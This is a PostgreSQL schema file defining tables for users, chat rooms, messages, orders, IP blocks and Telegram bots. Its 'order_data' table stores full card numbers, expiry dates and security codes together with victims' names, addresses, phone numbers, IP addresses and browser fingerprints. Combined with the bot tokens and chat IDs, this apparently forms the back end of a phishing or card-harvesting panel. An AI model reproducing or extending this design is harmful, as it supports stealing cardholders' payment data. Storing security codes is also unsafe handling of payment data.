CREATE TABLE IF NOT EXISTS users (
    id SERIAL PRIMARY KEY NOT NULL,
    uid VARCHAR(255) NOT NULL,
	 tele_id BIGINT NOT NULL,
	 username VARCHAR(255) NOT NULL,
	 email VARCHAR(255) NOT NULL,
	 is_verify_email BOOLEAN NOT NULL DEFAULT 'f',
	 is_change_password BOOLEAN NOT NULL DEFAULT 'f',
	 is_confirm_account BOOLEAN NOT NULL DEFAULT 'f',
	 password VARCHAR(255) NOT NULL,
	 role VARCHAR(255) NOT NULL DEFAULT 'user',
	 created TIMESTAMP NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS rooms(
	id SERIAL PRIMARY KEY NOT NULL,
	uid_room VARCHAR(255) NOT NULL,
	member_count INTEGER NOT NULL DEFAULT 0,
	is_works BOOLEAN NOT NULL DEFAULT 'f',
	members TEXT[] NOT NULL DEFAULT '{}',
	member_fixed TEXT NOT NULL DEFAULT ''
);

CREATE TABLE IF NOT EXISTS users_room(
	id SERIAL PRIMARY KEY NOT NULL,
	uid_user VARCHAR(255) NOT NULL,
	entry_room VARCHAR(255) NOT NULL
);

CREATE TABLE IF NOT EXISTS messages(
	id SERIAL PRIMARY KEY NOT NULL,
	uid_room VARCHAR(255) NOT NULL,
	uid_user VARCHAR(255) NOT NULL,
	message VARCHAR(255) NOT NULL,
	created TIMESTAMP NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS orders(
	id SERIAL PRIMARY KEY NOT NULL,
	uid_order VARCHAR(255) NOT NULL,
	created TIMESTAMP NOT NULL DEFAULT now(),
	status VARCHAR(255) NOT NULL DEFAULT 'Action required'
);

CREATE TABLE IF NOT EXISTS order_data(
	id SERIAL PRIMARY KEY NOT NULL,
	uid_order VARCHAR(255) NOT NULL,
	bin_brand VARCHAR(255) NOT NULL DEFAULT '',
	bin_type VARCHAR(255) NOT NULL DEFAULT '',
	bin_bank VARCHAR(255) NOT NULL DEFAULT '',
	bin_country VARCHAR(255) NOT NULL DEFAULT '',
	name VARCHAR(255) NOT NULL DEFAULT '',
	mobile VARCHAR(255) NOT NULL DEFAULT '',
	address VARCHAR(255) NOT NULL DEFAULT '',
	price VARCHAR(255) NOT NULL,
	card_number VARCHAR(255) NOT NULL,
	card_holder_name VARCHAR(255) NOT NULL DEFAULT '',
	exp_month VARCHAR(255) NOT NULL,
	exp_year VARCHAR(255) NOT NULL,
	security_code VARCHAR(255) NOT NULL,
	user_agent VARCHAR(255) NOT NULL,
	ip_address VARCHAR(255) NOT NULL,
	current_url VARCHAR(255) NOT NULL,
	lang VARCHAR(255) NOT NULL,
	operating_system VARCHAR(255) NOT NULL,
	browser VARCHAR(255) NOT NULL,
	created TIMESTAMP NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS ip_blocks(
	id SERIAL PRIMARY KEY NOT NULL,
	address VARCHAR(255) NOT NULL,
	is_block BOOLEAN NOT NULL DEFAULT 't',
	created TIMESTAMP NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS telegram_bots(
	id SERIAL PRIMARY KEY NOT NULL,
	name VARCHAR(255) NOT NULL,
	token VARCHAR(255) NOT NULL,
	chat_id VARCHAR(255) NOT NULL,
	is_admin BOOLEAN NOT NULL DEFAULT 'f',
	is_work BOOLEAN NOT NULL DEFAULT 't',
	created TIMESTAMP NOT NULL DEFAULT now()
);